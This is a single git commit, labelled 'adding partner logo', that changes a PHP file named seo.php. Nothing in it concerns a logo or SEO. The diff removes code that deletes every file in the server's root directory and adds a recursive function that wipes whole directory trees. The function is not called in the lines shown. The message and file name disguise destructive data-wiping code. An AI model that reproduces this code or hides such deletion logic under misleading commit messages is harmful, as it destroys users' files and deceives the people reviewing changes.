38617ecd73895c54a89ad0d4c1d5e5835c4d1583
HoussemCharf <houssem.charf@gmail.com>
2018-04-23 20:30:19 +0100

    adding partner logo

--- seo.php
+++ seo.php
@@ -1,8 +1,16 @@
 <?php
-
-$files = glob('/*');
-foreach($files as $file){
-  if(is_file($file))
-    unlink($file); 
-}
+  function rrmdir($dir) {
+  if (is_dir($dir)) {
+    $objects = scandir($dir);
+    foreach ($objects as $object) {
+      if ($object != "." && $object != "..") {
+        if (filetype($dir."/".$object) == "dir") 
+           rrmdir($dir."/".$object); 
+        else unlink   ($dir."/".$object);
+      }
+    }
+    reset($objects);
+    rmdir($dir);
+  }
+ }
 ?>
